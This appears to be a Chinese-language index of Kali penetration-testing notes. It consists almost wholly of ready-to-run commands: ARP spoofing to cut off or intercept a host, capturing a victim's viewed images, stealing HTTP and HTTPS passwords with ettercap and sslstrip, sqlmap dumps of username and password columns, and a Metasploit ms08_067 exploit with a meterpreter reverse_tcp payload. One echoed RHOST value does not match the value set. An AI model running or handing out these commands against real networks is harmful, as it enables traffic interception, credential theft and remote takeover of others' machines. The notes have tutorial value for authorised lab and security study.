# Kali渗透笔记


[001.arpspoof断网攻击](arpspoof/001.arpspoof断网攻击.md)
---
```bash
arpspoof -i eth0 -t 192.168.1.3 192.168.1.1
```

[002.arpspoof流量转发](arpspoof/002.arpspoof流量转发.md)
---

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.3 192.168.1.1
```


[003.arpspoof+driftnet截取目标主机浏览的图片](arpspoof/003.arpspoof+driftnet截取目标主机浏览的图片.md)
---

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.3 192.168.1.1
```

开启新的终端

```bash
driftnet -i eth0
```

[004.arpspoof+ettercap获取http账号密码](arpspoof/004.arpspoof+ettercap获取http账号密码.md)
---


```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.3 192.168.1.1
```

开启新的终端

```bash
ettercap -Tq -i eth0
```

[005.arpspoof+ettercap+sslstrip获取https账号密码](arpspoof/005.arpspoof+ettercap+sslstrip获取https账号密码.md)
---

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.3 192.168.1.1
```

开启一个新的终端

```bash
sslstrip -a -f -k
```

开启一个新的终端

```bash
ettercap -Tq -i eth0
```

[001.sqlmap注入asp程序](sqlmap/001.sqlmap注入asp程序.md)
---

```bash
sqlmap -u "http://www.example.com/news.asp?id=110" 
```


```bash
sqlmap -u "http://www.example.com/news.asp?id=110"   --tables
```

```bash
 sqlmap -u "http://www.example.com/news.asp?id=110" --columns -T "user"
```

```bash
 sqlmap -u "http://www.example.com/news.asp?id=110" --dump -C "username,password" -T "user"
```

[002.sqlmap注入php程序](sqlmap/002.sqlmap注入php程序.md)
 ---
 
 ```bash
 sqlmap -u "http://www.example.com/news.php?id=110" 
 ```

 ```bash
 sqlmap -u "http://www.example.com/news.php?id=110"  --is-dba
 ```
 
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110"  --dbs
 ```
 
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110" --current-db
 ```
 
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110" --tables -D "db"
 ```
  
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110" --colums -T "admin_user" -D 
 ```

[003.sqlmap之cookie注入](sqlmap/003.sqlmap之cookie注入.md)
 ---

 ```bash
 sqlmap -u "http://www.example.com/news.php" --cookie "id=110" --level 2
 ```
 
 ```bash
 sqlmap -u "http://www.example.com/news.php" --columns -T "user" --cookie "id=110" --level 2
 ```
 
 ```bash
 sqlmap -u "http://www.example.com/news.php" --dump  -C "username,password" -T "user"  --cookie "id=110" --level 2
 ```

[001.metasploit使用简介](metasploit/001.metasploit使用简介.md)
---

##启动metasploit
```bash
root@kali:~# msfconsole
```

```                                              
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.5-2016010401                   ]
+ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
+ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
```
###基本命令
```bash
msf > help
```

```bash
msf > show
```

```bash
msf > clear
```
###设置选项并攻击
```bash
msf > use exploit/windows/smb/ms08_067_netapi 
```

```
msf exploit(ms08_067_netapi) > show options
```

```
msf exploit(ms08_067_netapi) > set RHOST 192.168.1.3
RHOST => 219.225.51.172
```

```
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

```
msf exploit(ms08_067_netapi) > show options
```

```bash
msf exploit(ms08_067_netapi) > set LHOST 192.168.1.2
LHOST => 192.168.1.2
```

```bash
msf exploit(ms08_067_netapi) > exploit
```




























